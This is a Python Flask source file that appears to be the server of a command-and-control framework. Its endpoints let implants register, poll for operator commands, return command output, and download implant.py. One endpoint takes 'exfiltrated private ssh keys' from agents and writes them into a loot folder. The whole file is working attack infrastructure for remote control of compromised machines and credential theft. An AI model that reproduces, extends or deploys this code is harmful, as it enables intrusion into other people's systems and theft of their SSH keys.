from datetime import datetime
from flask import request
from flask import abort, send_from_directory
import models
import constants
import helper


@constants.api.route('/api/1.1/add_command', methods=['POST'])
def add_command():
    """API endpoint that allows the bot terminal to add
    commands to the Command table in the database

    :returns: a json RPC object containing any finished jobs and the new job ID
    :rtype: dict
    """
    if request.method == 'POST':
        json = request.json
        if json is None:
            return "Bad request"
        command = json['params']
        implantID = json['method'][4:]
        new_comm = models.Commands(implantID=implantID, command=command)
        models.db.session.add(new_comm)
        models.db.session.flush()
        models.db.session.commit()
        models.db.session.refresh(new_comm)
        res = models.Commands.query.filter(
                                    models.Commands.implantID == implantID,
                                    models.Commands.retrieved == True,
                                    models.Commands.displayed == False
                                    ).first()
        output = f"[+] new job started with id {new_comm.commandID}"
        if res is not None and res.output is not None:
            res.displayed = True
            output += f"\n[*] job with id {res.commandID} finished with output: \n{res.output}"
            models.db.session.flush()
            models.db.session.commit()
        rpc = {}
        rpc["result"] = output
        rpc["jsonrpc"] = json["jsonrpc"]
        rpc["id"] = json["id"]
        return rpc


@constants.api.route('/api/1.1/add_agent', methods=['POST'])
def agent_add():
    """API endpoint that allows an implant to register
    itself to the server

    :returns: the new agent ID
    :rtype: str
    """
    if request.method == 'POST':
        agent_dict = request.json
        id = helper.add_agent(agent_dict)
        return str(id)


@constants.api.route('/api/1.1/get_command', methods=['POST'])
def get_command():
    """API endpoint that allows an implant to fetch
    commands from the server

    :returns: none if there are no commands to retrieve,
    else the command and it's ID
    :rtype: str
    """
    if request.method == 'POST':
        json = request.json
        if json is None:
            return "Bad request"
        agent_id = int(json['id'])
        agent = models.Agent.query.filter(models.Agent.id == agent_id).first()
        curr_time = datetime.now()
        agent.lastSeen = curr_time.strftime("%d %B, %Y %H:%M:%S")
        res = models.Commands.query.filter(
                                    models.Commands.implantID == agent_id,
                                    models.Commands.retrieved == False
                                    ).first()
        if res is None:
            models.db.session.commit()
            models.db.session.flush()
            return "None"
        res.retrieved = True
        models.db.session.flush()
        models.db.session.commit()
        return res.command + "," + str(res.commandID)


@constants.api.route('/api/1.1/command_out', methods=['POST'])
def command_out():
    """API endpoint that allows an implant to send
    output of commands back to the server

    :returns: status to the agent of whether it received the output
    :rtype: str
    """
    print(request.method)
    if request.method == 'POST':
        json = request.json
        if json is None:
            return "Bad request"
        output = json['output']
        implantID = json['implantID']
        commandID = json['commandID']
        command = models.Commands.query.filter(
                                    models.Commands.implantID == implantID,
                                    models.Commands.commandID == commandID
                                    ).first()
        command.output = output
        models.db.session.flush()
        models.db.session.commit()
        return 'Received'


@constants.api.route('/api/1.1/ssh_keys', methods=['POST'])
def ssh_keys():
    """API endpoint that allows an agent to send back exfiltrated
    private ssh keys

    :returns: status to the agent of whether it received the keys
    :rtype: str
    """
    if request.method == 'POST':
        json = request.json
        if json is None:
            return "Bad request"
        key_dict = json['keys']
        agent_id = json['id']
        with open(f"loot/agent_{agent_id}/ssh_keys.txt", 'a+') as file:
            for key in key_dict:
                file.write(f"{key}: {key_dict[key]}\n")
        return 'Received BINGUS MODE'


@constants.api.route('/api/1.1/retrieve_scripts', methods=['GET'])
def scripts():
    """API endpoint that allows an agent to retrieve scripts
    from the server

    :returns: files that the agent requested
    :rtype: file
    """
    try:
        return send_from_directory('implant',
                                   path='implant.py',
                                   filename='implant.py',
                                   as_attachment=True)
    except FileNotFoundError:
        abort(404)
